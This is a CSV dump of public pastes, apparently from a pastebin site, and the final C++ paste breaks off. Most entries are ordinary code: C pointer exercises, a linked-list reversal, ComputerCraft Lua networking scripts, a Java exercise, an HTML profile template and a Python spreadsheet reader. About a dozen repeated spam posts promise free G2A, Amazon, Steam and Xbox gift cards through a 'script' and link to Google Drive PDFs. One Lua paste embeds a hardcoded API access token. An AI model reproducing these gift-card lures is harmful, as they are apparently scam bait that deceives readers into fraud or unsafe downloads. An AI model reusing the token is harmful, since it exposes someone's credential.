id,title,username,language,date,content
s2ckSKrb,ü§ëG2A.com Free Gift Card FIX July 2024üéÅ,thepplayz,JavaScript,Wednesday 3rd of July 2024 07:05:28 AM CDT,"G2A.com complimentary gift card & gaming guide.
Any gift card for free on G2A.com including Amazon gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?30516

Working as of:
July 1 2024

"
DuXSBqpX,Untitled,dllbridge,C,Wednesday 3rd of July 2024 07:00:09 AM CDT,"
#include<stdio.h>

/////////////////////////////////
struct   Big
{
    int length;
    int  width;
    int   nMax;
};


void foo(Big *);

////////////////////////////////////////////
int main()
{
    Big  b;
    
    b.length = 12;
    b. width =  2;    
    b.  nMax =  5;
	
	foo(&b);   
}

/////////////////////////////////////////////
void foo(Big *p)
{
	printf("" - - - - - \n"");
	printf(""address b.length = %d\n"",   &p->length);
	printf(""address b. width = %d\n"",   &p-> width);
	printf(""address b.  nMax = %d\n"",   &p->  nMax);	
	printf("" p = %d\n"", p);	
	
	char *pn = (char*)p;
	
	pn = pn + 4;
	
	printf("" pn = %d\n"", pn);	
	
	// –†–∞—Å–ø–µ—á–∞—Ç–∞—Ç—å –∞–¥—Ä–µ—Å–∞ –≤—Å–µ—Ö –ø–æ–ª–µ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã –±–µ–∑ —É–ø–æ–º–∏–Ω–∞–Ω–∏—è –∏—Ö –∏–º—ë–Ω
}



/*
#include<stdio.h>

/////////////////////////////////
struct   Big
{
    int length;
    int  width;
};


void foo(Big *);

////////////////////////////////////////////
int main()
{
    Big a, b;
    
    a.length = 12;
    b.length =  5;
    b. width =  2;    
	printf(""        a.length = %d\n"",   a.length);
    printf(""address a.length = %d\n"", & a.length);
    printf(""address a. width = %d\n"", & a. width); 
	
	foo(&b);   
}

/////////////////////////////////////////////
void foo(Big *p)
{
	printf("" - - - - - \n"");
	printf(""address b.length = %d\n"",   &p->length);
	printf(""address b. width = %d\n"",   &p-> width);
	printf("" p = %d\n"", p);	
	
	char *pn = (char*)p;
	
	pn = pn + 4;
	
	printf("" pn = %d\n"", pn);	
}



*/



"
ZMvmksut,ü§ëG2A.com Free Gift Card FIX July 2024üéÅ,sirmikey,JavaScript,Wednesday 3rd of July 2024 06:59:25 AM CDT,"G2A.com complimentary gift card & gaming guide.
Any voucher for free on G2A.com including Xbox gift cards & anything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?30516

Working as of:
July 1 2024

"
W2LfuvSR,üéÅ G2A.COM FREE GIFT CARD GUIDE JULY 2024 V4üéÅ,wwxcwx,GetText,Wednesday 3rd of July 2024 06:58:14 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
03 > 09 July 2024"
RTQuLrgp,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,sayid83,JavaScript,Wednesday 3rd of July 2024 06:53:20 AM CDT,"G2A.com free voucher & gaming guide.
Any voucher for free on G2A.com including Playstation gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?30516

Working as of:
1st of July 2024

"
x3E9raCG,ü§ëG2A.com Free Gift Card FIX July 2024üéÅ,PetrikDev,JavaScript,Wednesday 3rd of July 2024 06:47:15 AM CDT,"G2A.com complimentary gift card & games guide.
Any gift card for free on G2A.com including Steam gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?30516

Working as of:
1st of July 2024

"
VrrBwNPX,üéÅ G2A.COM FREE GIFT CARD GUIDE JUL 2024 V4 üéÅ,jusst2k4,GetText,Wednesday 3rd of July 2024 06:44:43 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_572119.pdf
 
Working as of:
03 July 2024"
upWsG2Tx,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,x3kiN,JavaScript,Wednesday 3rd of July 2024 06:41:12 AM CDT,"G2A.com free gift card & gaming guide.
Any voucher for free on G2A.com including Xbox gift cards & anything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?30516

Working as of:
July 1 2024

"
K2HzN94x,ü§ëG2A.com Free Gift Card FIX July 2024üéÅ,FeasModz514,JavaScript,Wednesday 3rd of July 2024 06:35:09 AM CDT,"G2A.com free voucher & games guide.
Any item for free on G2A.com including Xbox gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?30516

Working as of:
1st of July 2024

"
vDcKnGx2,ü§ë G2A.COM FREE GIFT CARD GUIDE JULY 2024 V4ü§ë,x2w,GetText,Wednesday 3rd of July 2024 06:31:41 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
03 > 09 July 2024"
yKigUC52,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,kjihu25,JavaScript,Wednesday 3rd of July 2024 06:29:06 AM CDT,"G2A.com complimentary voucher & games guide.
Any item for free on G2A.com including Steam gift cards & anything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?30516

Working as of:
July 1 2024

"
6nCF4kc0,üéÅ G2A.COM FREE GIFT CARD GUIDE JULY 2024 V4üéÅ,BitcoinScript2020,GetText,Wednesday 3rd of July 2024 06:25:57 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
03 > 09 July 2024"
f7rsUN0t,Algoverse_adesh_34,kucheasysa,Python,Wednesday 3rd of July 2024 06:24:38 AM CDT,"# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, val=0, next=None):
#         self.val = val
#         self.next = next
class Solution:
    def reverseList(self, head: Optional[ListNode]) -> Optional[ListNode]:
        l1= None
        current = head

        while current:
            nex = current.next
            current.next = l1
            l1=current
            current = nex
        return l1"
jaCaFagB,ü§ëG2A.com Free Gift Card FIX July 2024üéÅ,Bufayez,JavaScript,Wednesday 3rd of July 2024 06:22:55 AM CDT,"G2A.com complimentary voucher & games guide.
Any item for free on G2A.com including Xbox gift cards & anything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?30516

Working as of:
1st of July 2024

"
qhKZdWeq,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,buch,JavaScript,Wednesday 3rd of July 2024 06:16:52 AM CDT,"G2A.com free voucher & games guide.
Any gift card for free on G2A.com including Playstation gift cards & anything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?30516

Working as of:
July 1 2024

"
MniYmnXM,Untitled,dllbridge,C,Wednesday 3rd of July 2024 06:11:52 AM CDT,"#include<stdio.h>

/////////////////////////////////
struct   Big
{
    int length;
    int  width;
};


////////////////////////////////////////////
int main()
{
    Big a, b;
    
    a.length = 12;
    
	printf(""        a.length = %d\n"",   a.length);
    printf(""address a.length = %d\n"", & a.length);
    printf(""address a. width = %d\n"", & a. width);    
}




"
tPif1GiP,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,Alfonso1119,JavaScript,Wednesday 3rd of July 2024 06:10:48 AM CDT,"G2A.com complimentary gift card & gaming guide.
Any gift card for free on G2A.com including Steam gift cards & anything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?30516

Working as of:
July 1 2024

"
sNZpz0L8,data976,TestGuy1,JSON,Wednesday 3rd of July 2024 06:00:10 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '77d57b012ea20834249fa28e8d87c6e840e5233b0cc5e2dca5dbc27a4013a04b17bbd677c621d6a3ad518b6fda13ee7f0ac12d00be394b1264a5037d99f87eb018fa00176ea44374e9a30835106487c919b6f0484f07648ee48db0a1db3ac0656ba3dc58337f54a50764c4ff002fb43003f0376087cebef13982e255eb1786d8',
  otherdata: [
    '317b65658fff2de1b3d2f7f527afe853',
    'ac33bd50314de75af901513717fb982d',
    'bfe3414a95d0c2f54f03d399b519795f',
    '6f437c7f24b18b03f9ad3b9b2c7ed285',
    '2d83dc2fb450ef403606c63e00146ef9',
    'a45ae52fd1272f6499461bf3043bbc83',
    '97733d1027cd9226dc58330f5e2dc765',
    '708470b75e6d497dabd41aae231436de'
  ]
}"
TWpXLz5v,Untitled,NoireNeige,Lua,Wednesday 3rd of July 2024 05:06:27 AM CDT,"-- Exemple hypoth√©tique pour ComputerCraft

local http = require(""socket.http"")
local json = require(""json"") -- Vous aurez besoin d'une biblioth√®que pour parser JSON
local access_token = ""3d3511a94d5a4a36bfddcd4d31e""
local endpoint = ""me/playlists""

-- Fonction pour faire une requ√™te GET
local function make_spotify_api_request(endpoint, access_token)
    local url = ""https://api.spotify.com/v1/"" .. endpoint
    local headers = {
        [""Authorization""] = ""Bearer "" .. access_token
    }

    local body = {}
    local res, code, headers, status = http.request {
        url = url,
        headers = headers,
        sink = ltn12.sink.table(body)
    }

    if code == 200 then
        local response = table.concat(body)
        return json.decode(response) -- Parse la r√©ponse JSON
    else
        print(""Erreur lors de la requ√™te √† l'API Spotify:"", status)
        return nil
    end
end

-- Exemple d'utilisation
local response = make_spotify_api_request(endpoint, access_token)
if response then
    -- Traiter la r√©ponse et afficher sur l'√©cran de ComputerCraft
    for i, playlist in ipairs(response.items) do
        print(""Nom de la playlist:"", playlist.name)
        -- Afficher d'autres informations pertinentes
    end
else
    print(""Erreur lors de la requ√™te √† l'API Spotify"")
end"
LrdVBW3v,iotaLibClient,Lanzr,Lua,Wednesday 3rd of July 2024 04:04:32 AM CDT,"require(""listUILib"")
local g_host
local g_server_protocal
local g_entry_list = {}
local g_retry_times = 4

-- init for connect Server
local function init()
    local ret = false
    print(""pls appoint proc"")
    rednet.open(""back"")
    g_server_protocal = io.read()
    while g_retry_times do 
        g_host = rednet.lookup(g_server_protocal)
        if (g_host ~= nil) then
            local msgBoxPack = {[""cmd""] =""get_list"",[""msg""] = {}}
            ret = true
            print(""target found"")
            rednet.send(g_host, msgBoxPack,g_server_protocal)
            break
        end
        g_retry_times = g_retry_times - 1
    end
    return ret
end

local function key_listener()
    os.pullEvent(""init_done"")
    local w,h = term.getSize()
    page.init(g_entry_list,w,h)
    while true do
        local msgBoxPack = {[""cmd""] =""compile"",[""msg""] = {}}
        local event, key, isHeld = os.pullEvent(""key"")
        local kvalue = keys.getName(key)
        if kvalue == ""enter"" then
            local index = page.getSelect()
            msgBoxPack[""msg""] = g_entry_list[index]
            rednet.send(g_host, msgBoxPack, g_server_protocal)
        else
            page.control(kvalue)
        end
    end
end

-- netCheck to receive Server Message
local function net_listener()
    while 1 do 
        local event, sender, message, protocol = os.pullEvent(""rednet_message"")
        if(protocol == g_server_protocal) then
            print(""-----------------"")
            if message[""cmd""] ==""ret_list"" then
                print(""receive"")
                g_entry_list = message[""msg""]
                sleep(2)
                os.queueEvent(""init_done"")
            end

        end
    end 
end

function mainloop()
    local ret = init()
    if ret then
        parallel.waitForAny(net_listener,key_listener)
    else
        print(""target not found"")
    end
end

mainloop()"
mpKFgu5N,listUILib,Lanzr,Lua,Wednesday 3rd of July 2024 04:04:14 AM CDT,"page = {}

local g_window_size = { w = 0, h = 0 }

page.mPageIndex = 0
page.mRowIndex = 0
page.mPageCount = 0
page.mItemCount = 0
page.mNowMaxPageIndex = 0
page.topBar = nil
page.body = nil

local g_entry_list = {}

local winNormColor = {
    font = colors.black,
    bg = colors.lime
}

local winFocusColor = {
    font = colors.gray,
    bg = colors.pink
}

-- renewTopBar and Body
local function flushTopBar()
    local str = string.format(""%3d/%3d      size:%d"",page.mPageIndex,page.mPageCount,page.mItemCount)
    page.topBar.clear()
    page.topBar.setCursorPos(1,1)
    page.topBar.write(str)
end

local function flushBody()
    page.body.clear()
    local nPos = 1
    local startPos = (page.mPageIndex - 1) * g_window_size.h + 1
    local endPos = startPos + page.mNowMaxPageIndex - 1
    for index = startPos, endPos, 1 do
        page.body.setCursorPos(1,nPos)
        if(nPos == page.mRowIndex) then -- select backGround Color
            page.body.setBackgroundColor(winFocusColor.bg)
            page.body.setTextColor(winFocusColor.font)
            page.body.clearLine()
        else
            page.body.setBackgroundColor(winNormColor.bg)
            page.body.setTextColor(winNormColor.font)
        end
        page.body.write(g_entry_list[index])
        nPos = nPos + 1
    end
    page.body.setBackgroundColor(winNormColor.bg)
    page.body.setTextColor(winNormColor.font)
end

-- switch the page 
local function pageChange(offset)
    local targetPageIndex = page.mPageIndex + offset
    -- page.LDebug(page.mPageIndex,19)
    targetPageIndex = targetPageIndex > 0 and targetPageIndex or 1
    targetPageIndex = targetPageIndex <= page.mPageCount and targetPageIndex or page.mPageCount
    page.mPageIndex = targetPageIndex
    local remainder = page.mItemCount % g_window_size.h
    if (targetPageIndex == page.mPageCount and remainder ~= 0) then
        -- have remainder
        page.mNowMaxPageIndex = remainder
    else 
        -- common page
        page.mNowMaxPageIndex = g_window_size.h
    end
    
    flushTopBar()
    flushBody()
end

--[[
    the key method for use
]]
    
-- debug in window
function page.LDebug(str,col)
    term.setCursorPos(1,col)
    term.setTextColor(colors.orange)
    term.setBackgroundColor(colors.white)
    term.clearLine()
    term.write(str)
end

-- init
function page.init(list,width,height)
    g_window_size.w = width
    g_window_size.h = height - 3
    page.topBar = window.create(term.current(), 1, 1, g_window_size.w, 1)
    page.body = window.create(term.current(), 1, 2, g_window_size.w, g_window_size.h)
    
    page.topBar.setBackgroundColor(colors.orange)
    page.topBar.setTextColor(colors.white)
    page.body.setBackgroundColor(winNormColor.bg)
    page.body.setTextColor(winNormColor.font)
    page.mItemCount = table.getn(list)   
    page.mPageCount =  (page.mItemCount - 1 - (page.mItemCount - 1) % g_window_size.h) / g_window_size.h + 1
    page.mPageIndex = 1   
    page.mRowIndex = 1
    g_entry_list = list

    term.clear()
    term.setTextColor(colors.white)
    pageChange(0)
end

-- get current select
function page.getSelect()
    local index = (page.mPageIndex -1) * g_window_size.h + page.mRowIndex
    return index
end

local keyMap = {
    [""up""]=(function () 
        if(page.mRowIndex > 1) then
            page.mRowIndex = page.mRowIndex - 1
        -- LDebug(""nowPos ""..(pageIndex-1) * mh + page.mRowIndex,18)
            flushBody()
        end
    end),
    [""down""]=(function () 
        if(page.mRowIndex < g_window_size.h and page.mRowIndex < page.mNowMaxPageIndex) then
            page.mRowIndex = page.mRowIndex + 1
            -- LDebug(""nowPos ""..(pageIndex-1) * mh + page.mRowIndex,18)
            flushBody()
        end
    end),
    [""left""]=(function ()
        if(page.mPageIndex > 1) then
            page.mRowIndex = 1
            pageChange(-1)
        end
    end),
    [""right""]=(function () 
        if(page.mPageIndex < page.mPageCount) then
            page.mRowIndex = 1
            pageChange(1)
        end
    end),
}

-- control the page
function page.control(cmd)
    local cb = keyMap[cmd]
    if cb ~= nil then
        keyMap[cmd]()
    end
end
"
xGn2XKzi,Untitled,myrdok123,Java,Wednesday 3rd of July 2024 04:04:03 AM CDT,"package ConditionlaStatementsAdvanced;

import java.util.Scanner;

public class P11FruitShop {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        String fruit = scanner.nextLine();
        String day = scanner.nextLine();
        double count = Double.parseDouble(scanner.nextLine());

        double price = 0;
        boolean isValid = true;

        switch (day){
            case ""Monday"":
            case ""Tuesday"":
            case ""Wednesday"":
            case ""Thursday"":
            case ""Friday"":
                //banana	apple	orange	grapefruit	kiwi	pineapple	grapes
                //2.50	    1.20	0.85	1.45	    2.70	5.50	    3.85
                if (fruit.equals(""banana"")){
                    price = count * 2.50;
                } else if (fruit.equals(""apple"")) {
                    price = count * 1.20;
                }else if (fruit.equals(""orange"")){
                    price = count * 0.85;
                }else if (fruit.equals(""grapefruit"")){
                    price = count * 1.45;
                }else if (fruit.equals(""kiwi"")){
                    price = count * 2.70;
                }else if (fruit.equals(""pineapple"")){
                    price = count * 5.50;
                }else if (fruit.equals(""grapes"")){
                    price = count * 3.85;
                }else {
                    isValid = false;
                }

                break;

            case ""Saturday"":
            case ""Sunday"":
                //banana	apple	orange	grapefruit	kiwi	pineapple	grapes
                //2.70	    1.25	0.90	1.60	    3.00	5.60	    4.20
                if (fruit.equals(""banana"")){
                    price = count * 2.70;
                } else if (fruit.equals(""apple"")) {
                    price = count * 1.25;
                }else if (fruit.equals(""orange"")){
                    price = count * 0.90;
                }else if (fruit.equals(""grapefruit"")){
                    price = count * 1.60;
                }else if (fruit.equals(""kiwi"")){
                    price = count * 3.00;
                }else if (fruit.equals(""pineapple"")){
                    price = count * 5.60;
                }else if (fruit.equals(""grapes"")){
                    price = count * 4.20;
                }else {
                    isValid = false;
                }
                break;

            default:
                isValid = false;
                break;
        }

        if(isValid){
            System.out.printf(""%.2f"",price);
        }else {
            System.out.println(""error"");
        }
    }
}"
GQG0XkU5,iotaLibServer,Lanzr,Lua,Wednesday 3rd of July 2024 04:03:28 AM CDT,"
local g_modem = peripheral.find(""modem"")
local impetus = peripheral.wrap(""bottom"")
local g_modem_ID = peripheral.getName(g_modem)

local ID = os.getComputerID()
local g_Protocal = ""iotaServer_""..ID
local g_hostName = ""iotaServer ""..ID
-- iotaServer_0
local g_iota_list = {}

local function init()
    rednet.open(g_modem_ID)
    print(""my Proc is:\n  "",g_Protocal)
    rednet.host(g_Protocal,g_hostName)
end

local function checkIotaList()
    g_iota_list = fs.list(""iota"")
end

local function compileLoop(filename)
    shell.run(""hex ""..""iota/""..filename)
    sleep(1)
    impetus.activateCircle()
    sleep(1)
end

local function net_listener()
    init()
    while true do 
        local msgBoxPack = {[""cmd""] ="""",[""msg""] = {}}
        local event, sender, iMsgBox, protocol = os.pullEvent(""rednet_message"")
        if(protocol == g_Protocal) then
            local cmd = iMsgBox[""cmd""]
            local msg = iMsgBox[""msg""]
            if(cmd == ""get_list"")then
                checkIotaList()
                msgBoxPack[""cmd""] = ""ret_list""
                msgBoxPack[""msg""] = g_iota_list
                rednet.send(sender, msgBoxPack,protocol)
                sleep(1)
            end
            if(iMsgBox[""cmd""] == ""compile"")then
                compileLoop(msg)
            end
        end 
    end 
end

local function mainloop()
    net_listener()
end

mainloop()"
V17GQy1h,(FTU) Request for Wolkark,Ansuperope,HTML,Wednesday 3rd of July 2024 03:31:47 AM CDT,"<!-- ================================================================================
 
Request for https://toyhou.se/WolkArk
Please let me know if anything is broken
 
My socials: https://linktr.ee/ansuperope
    
    
Can:
    - edit / frakenstein
    - can move or edit credits as long as it's somewhere
    
Cannot:
    - use for AI trianing / learning
    - remove credits
 
 
CODE LINK:
    https://pastebin.com/V17GQy1h
    
- - -
 
Use ""Ctrl"" + ""F"" to find, edit and replace things easier

You might need to delete boostrap colors in order to use
custom colors and vice versa. You can use a mix of both
 
BOOTSTRAP COLORS
     - WINDOWS BARS:    bg-primary
     - MAIN BG:         bg-faded
     - IMPORTANT TEXT:  text-primary
     - OTHER TEXT:      text-secondary

CUSTOM COLORS
     - BG:              #000000
     - BORDER + ICON:   #622a03
     - TEXT:            #ffffff
     - LINE:            #444444
 
FONTS
     - HEADERS:   'Georgia'
    
JUMP TO FILL OUT
     - GENERAL:         LOREM
     - IMAGE:           LOREM_IMG
     - COLOR PALLETE:   LOREM_COLOR
 
- - -
 
RESOURCES
    
    Live Code Editor (Shows How Code will Look as You Type, Recommend Using)
        https://th.circlejourney.net/
    
    Help Thread
        https://toyhou.se/~forums/16.htmlcss-graphics/48845.-help-thread-ask-your-questions-here-

    Get Hex Color
        https://imagecolorpicker.com/
    
    Bootstrap Colors
        https://getbootstrap.com/docs/4.0/utilities/colors/
    
    Web Safe Fonts
        https://www.w3schools.com/csSref/css_websafe_fonts.php
    
    Icons
        https://fontawesome.com/search
    
    Bootstrap Spacing (px, py, my, mx, etc.)
        https://getbootstrap.com/docs/4.0/utilities/spacing/
    
    Columns / Widths (col, col-12, etc.)
        https://getbootstrap.com/docs/4.0/layout/grid/#auto-layout-columns
        
    Background Position
        https://www.w3schools.com/cssref/pr_background-position.php
        
    Background Size
        https://www.w3schools.com/cssref/css3_pr_background-size.php
   
================================================================================= -->



<!-- START CODE ===================================================================
=   max-width:#px;
= how wide the code can get. This is if you don't want the code to take the entire
= row / screen. You can leave it alone if you're fine with it
================================================================================= -->
<div class=""mx-auto row no-gutters justify-content-center"" style=""max-width:px;"">
    
    <!-- ===== CHAR IMAGE = TOP MOBILE / LEFT PC ==================================
    = works best if image is cropped as much as possible. Like there's hardly any
    = space between image and edge of image (if this makes sense idk how to explain
    = sorry ToT )
    =
    =   alt=""""
    = for screen readers or if image doesn't load. Insert a description of the
    = images between the quotes or leave it blank so screen reader will ignore it
    =
    =   width:#px;
    = can give the character image certain measurements but by default it will
    = automatically adjusts itself to show the full image uncut / not cropped.
    = If it is cropping or distorting then first make sure to crop your image
    = of as much extra empty space before inputting it in the code. If that
    = doesn't work try adjusting the height or width of the character info
    =
    =   object-fit:fill;
    = how the image will fit. Default is fill where image might distort to fit.
    = You can change fit to:
    =   cover means it is clipped to fit
    = 
    =   contain where it will resize the image to fit or
    ============================================================================= -->
    <div class=""col-12 col-lg-auto justify-content-lg-end"" style=""z-index:2;"">
        <img src=""LOREM_IMG""
            alt=""""
            class=""h-100"" style=""max-width:#px; object-fit:fill;"">
    </div>
    <!-- ===== END CHAR IMAGE = TOP MOBILE / LEFT PC ============================ -->
    
    
    
    <!-- ===== RIGHT SPACING TO MAKE CHARACTER IMAGE OVERLAP WITH CHAR INFO =======
    =   margin-right:-20px;
    = you might need to adjust the number depending on the character image
    ============================================================================= -->
    <div class=""hidden-md-down bg-primary"" style=""margin-right:-20px;""></div>
    
    
    
    <!-- ===== CHAR INFO + CREDITS = BOTTOM MOBILE / RIGHT PC =====================
    =   max-width:370px;
    = can mess with this, this will change how wide the info box is
    ============================================================================= -->
    <div class=""col-12 col-lg-auto"" style=""max-width:300px;"">
        
        <!-- ========== CHAR INFO =============================================== -->
        <div class=""p-4 h-100"" style=""border-radius:10px; background-color:#000000;"">
        <div class=""card border-left-0 p-3 text-center h-100"" style=""border-radius:10px; border-color:#622a03; background-color:#000000;
            color:#ffffff;""> <!-- inner line + text color -->
            
            <!-- tiny top text -->
            <div class=""mt-4 text-uppercase"" style=""font-family:'Georgia'; font-size:#px;"">lxvii</div>
            
            
            <!-- character name -->
            <div class=""mt-3 mb-n3 display-2 text-uppercase"" style=""font-family:'Georgia'; font-size:#px;"">LOREM</div>
            
            
            <!-- character title or nickname -->
            <div class=""mt-4 display-4 text-capitalize"" style=""font-family:'Georgia'; font-size:#px;"">LOREM</div>
            
            
            <!-- =============== DECORE ===========================================
            =   fa-2x
            = changes icon size. Can delete and use font-size:#px; instead to
            = change size for more flexibility 
            ===================================================================== -->
            <div class=""row no-gutters align-items-center"">
                
                <!-- left side - text -->
                <div class=""text-uppercase font-italic"" style=""font-family:'Georgia'; letter-spacing:2px;"">x x x</div>
                
                <!-- middle - line -->
                <div class=""col mx-2""><hr style=""border-top:2px solid #444444;""></div>
                
                <!-- right side - icon -->
                <div class=""fa-2x"" style=""color:#622a03; font-size:#px;"">
                    <i class=""fa-regular fa-feather""></i>
                </div>
                
            </div>
            <!-- =============== END DECORE ===================================== -->
            
            
            <!-- =============== COLOR PALLETE ================================== -->
            <div class=""mt-2 row no-gutters"">
                
                <div class=""col p-1 mr-1"" style=""background-color:#LOREM_COLOR;""></div>
                <div class=""col p-1 mr-1"" style=""background-color:#LOREM_COLOR;""></div>
                <div class=""col p-1 mr-1"" style=""background-color:#LOREM_COLOR;""></div>
                <div class=""col p-1 mr-1"" style=""background-color:#LOREM_COLOR;""></div>
                
                <!-- add more above here ========================================
                <div class=""col p-1 mr-1"" style=""background-color:#LOREM_COLOR;""></div>
                ============================================================== -->
                
            </div>
            <!-- =============== END COLOR PALLETE ============================== -->
            
            
            <!-- =============== ABOUT CHARACTER ==================================
            =   max-height:#px;
            = Replace # with any number if you want text to scroll after a
            = certain height. If you don't want it to scroll keep it blank but
            = keep in mind character image might get distorted / begin to cut
            = depending on how much you write. You might need to adjust this if
            = the character image is distorting or cropping
            ===================================================================== -->
            <div class=""mt-5 mb-3 font-italic"" style=""overflow:auto; max-height:280px; font-family:'Georgia'; font-size:#px;"">
                
                <p>LOREM</p>
                
                <p>LOREM</p>
                
                <!-- add more above here ========================================
                <p>LOREM</p>
                ============================================================== -->
                
            </div>
            <!-- =============== END ABOUT CHARACTER ============================ -->
            
        </div> <!-- end inner line + text color -->
        </div>
        <!-- ========== END CHAR INFO =========================================== -->
        
        
        <!-- ========== CREDITS - CAN MOVE AND EDIT BUT DON'T DELETE ============ -->
        <div class=""mt-2 text-center fa-2xs"">
            <a href=""https://toyhou.se/Ansuperope"" data-toggle=""tooltip"" title=""Code by Ansuperope""><i class=""fa-solid fa-trash""></i></a>
            <a href=""https://toyhou.se/WolkArk"" data-toggle=""tooltip"" title=""Layout by WolkArk""><i class=""fa-solid fa-table-layout""></i></a>
        </div>
        <!-- ========== END CREDITS ============================================= -->
        
    </div>
    <!-- ===== CHAR INFO + CREDITS = BOTTOM MOBILE / RIGHT PC =================== -->
    
</div>
<!-- END CODE =================================================================== -->"
9fLEiPLp,–ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è —ç–∫—Å–µ–ª—å,Rei_anami,Python,Wednesday 3rd of July 2024 03:31:16 AM CDT,"from openpyxl import load_workbook

print(""–≤—Å—Ç–∞–≤–∏—Ç—å –Ω–∞–∑–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞ excel –¥–æ .xlsx"", ""–ø—Ä–∏–º–µ—Ä"", ""orders - 2024-07-03T093148.376"", ""–∏ –Ω–∞–∂–∞—Ç—å Enter"", sep= ""\n"")
wbwb = str(input()) ##–∏–º—è —ç–∫—Å–µ–ª—è
wbwb = wbwb + '.xlsx'
#wbwb = 'orders - 2024-07-03T093148.376.xlsx'
#print(wbwb)
wb = load_workbook(wbwb)

#print('Yes1')
#print(wb)
#print(""-----------"")
#print(wb.get_sheet_names())
print(""---------------------------"")
#print(""++++----"")
sheet = wb['orders_report']
#print(sheet['H5'].value)
#print(sheet['I2'].value)
#print(""++++----"")
pr_pre = 0
pr_card = 0
pr_cash = 0
sn=""A"" #–Ω–æ–º–µ—Ä —Ç–æ–≤–∞—Ä–∞
sy = ""L"" #—è—á–µ–π–∫–∞
ss = ""D"" #—Å—Ç–∞—Ç—É—Å
sg = ""K"" #–≥—Ä—É–∑–æ–º–µ—Å—Ç–æ
n = []
y = []
s = []
#print(sheet['D52'].value, 'empty')
n_strok = 500
n_zakazov = 0
r={}
for j in range(2,n_strok):
  sn += str(j)
  sy += str(j)
  ss += str(j)
  sg += str(j)
  n_zakazov += 1

  r[sheet[sy].value]=[sheet[sn].value,sheet[ss].value]
  print('___',sheet[sy].value, '___',sheet[sn].value, sheet[ss].value) 
  n.append(sheet[sn].value)
  y.append(sheet[sy].value)
  s.append(sheet[ss].value)
  if sheet[sy].value == None and sheet[sg].value == None:
    print('stop',n_zakazov)
    break  
  sn=""A"" #–Ω–æ–º–µ—Ä —Ç–æ–≤–∞—Ä–∞
  sy = ""L"" #—è—á–µ–π–∫–∞
  ss = ""D"" #—Å—Ç–∞—Ç—É—Å
  sg = ""K"" #–≥—Ä—É–∑–æ–º–µ—Å—Ç–æ
      

print(""-----------------------------"")
print(n_zakazov)    
print(""-----------------------------"")    


print(""Enter 2 —Ä–∞–∑–∞ –¥–ª—è –≤—ã—Ö–æ–¥–∞"")
input()
input()
"
4c6scPG8,Untitled,MathinChina,C++,Wednesday 3rd of July 2024 03:24:51 AM CDT,"#include<bits/stdc++.h>
using namespace std;
#define MAX_N 205
int m[MAX_N][MAX_N],N,visit[MAX_N],t,data_stack[MAX_N],tmp,cnt,top;
void dfs1(int n)
{
	visit[n]=1;
	for(int i=1;i<=N;i++)if((m[n][i]==1)&&(!visit[i]))dfs1(i);
	data_stack[++tmp]=n;
}
void dfs2(int n)
{
	visit[n]=1;
	for (int i = N; i > 0; i--)
	{
		if ((m[n][i]==1)&&!visit[data_stack[i]])
		{
			cnt++;
			dfs2(data_stack[i]);
		}
	}
}
int main()
{
	scanf(""%d"",&N);
	for(int i=1;i<=N;i++)
	{
		do{
			scanf(""%d"",&t);
			m[i][t]=1;
		}while(t!=0);
	}
	for(int i=1;i<=N;i++)if(!visit[i])dfs1(i);
	for(int i=1;i<=N;i++)visit[i]=0;
